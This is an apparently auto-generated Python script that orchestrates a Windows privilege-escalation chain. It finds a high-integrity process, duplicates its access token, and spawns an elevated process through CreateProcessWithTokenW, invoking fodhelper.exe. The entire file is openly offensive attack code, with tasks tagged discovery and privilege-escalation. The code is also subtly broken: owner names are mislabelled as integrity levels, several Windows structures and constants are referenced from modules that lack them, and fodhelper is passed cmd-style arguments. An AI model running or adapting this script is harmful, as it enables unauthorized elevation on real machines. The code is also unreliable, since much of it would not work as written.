#!/usr/bin/env python3
import sys, json, time
import subprocess
from typing import Dict, Any
import ctypes
import win32api
import win32security
import os

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Command to list processes with their integrity levels
        command = [
            'powershell', 
            '-Command', 
            'Get-WmiObject Win32_Process | Select-Object ProcessId, Name, @{Name="IntegrityLevel";Expression={(Get-Process $_.ProcessId).GetOwner().User}}'
        ]
        
        # Execute the command
        result = subprocess.run(command, capture_output=True, text=True, timeout=10)
        
        # Parse the output
        process_info = None
        for line in result.stdout.splitlines():
            if 'High' in line:
                parts = line.split()
                process_id = int(parts[0])
                integrity_level = 'High'
                process_info = {'process_id': process_id, 'integrity_level': integrity_level}
                break
        
        # If no high integrity process found, return partial with None values
        if not process_info:
            process_info = {'process_id': None, 'integrity_level': None}
        
        return {'success': True, 'data': process_info,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial data with None values on failure
        return {'success': False, 'data': {'process_id': None, 'integrity_level': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        process_id = input_data.get('process_id')
        integrity_level = input_data.get('integrity_level')

        # Open the process with required access rights
        process_handle = win32api.OpenProcess(
            win32security.PROCESS_QUERY_INFORMATION, False, process_id
        )

        # Open the process token
        token_handle = win32security.OpenProcessToken(
            process_handle,
            win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY
        )

        # Duplicate the token
        duplicated_token_handle = win32security.DuplicateTokenEx(
            token_handle,
            win32security.SecurityImpersonation,
            win32security.TOKEN_ALL_ACCESS,
            win32security.TokenPrimary
        )

        # Close the original token handle
        win32api.CloseHandle(token_handle)

        # Return the duplicated token handle
        result = {
            "token_handle": duplicated_token_handle,
            "success": True
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'process_id': None, 'elevated': None}
    
    try:
        token_handle = input_data.get('token_handle')
        success = input_data.get('success', False)

        if not success:
            raise ValueError("Token duplication was not successful.")

        # Prepare the command to run via fodhelper.exe
        command = "fodhelper.exe"
        params = "/c start notepad.exe"  # Example elevated process

        # Use CreateProcessWithTokenW to spawn the process with the duplicated token
        # This requires the use of ctypes to interact with Windows API
        CreateProcessWithTokenW = ctypes.windll.advapi32.CreateProcessWithTokenW
        CreateProcessWithTokenW.argtypes = [
            ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.LPCWSTR,
            ctypes.wintypes.LPCWSTR, ctypes.wintypes.DWORD, ctypes.wintypes.LPVOID,
            ctypes.wintypes.LPCWSTR, ctypes.POINTER(ctypes.wintypes.STARTUPINFO),
            ctypes.POINTER(ctypes.wintypes.PROCESS_INFORMATION)
        ]
        CreateProcessWithTokenW.restype = ctypes.wintypes.BOOL

        # Constants for CreateProcessWithTokenW
        LOGON_WITH_PROFILE = 0x00000001
        CREATE_NEW_CONSOLE = 0x00000010

        # Setup structures for process creation
        startup_info = ctypes.wintypes.STARTUPINFO()
        process_info = ctypes.wintypes.PROCESS_INFORMATION()

        # Call CreateProcessWithTokenW
        success = CreateProcessWithTokenW(
            token_handle, LOGON_WITH_PROFILE, None, f"{command} {params}",
            CREATE_NEW_CONSOLE, None, None, ctypes.byref(startup_info), ctypes.byref(process_info)
        )

        if not success:
            raise RuntimeError("Failed to create process with token.")

        # Retrieve process ID
        process_id = process_info.dwProcessId

        result['process_id'] = process_id
        result['elevated'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Identify High-Integrity Process [discovery] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Identify High-Integrity Process): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Identify High-Integrity Process): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Duplicate Process Token [privilege-escalation] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Duplicate Process Token): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Duplicate Process Token): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Spawn Elevated Process [privilege-escalation] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Spawn Elevated Process): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Spawn Elevated Process): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))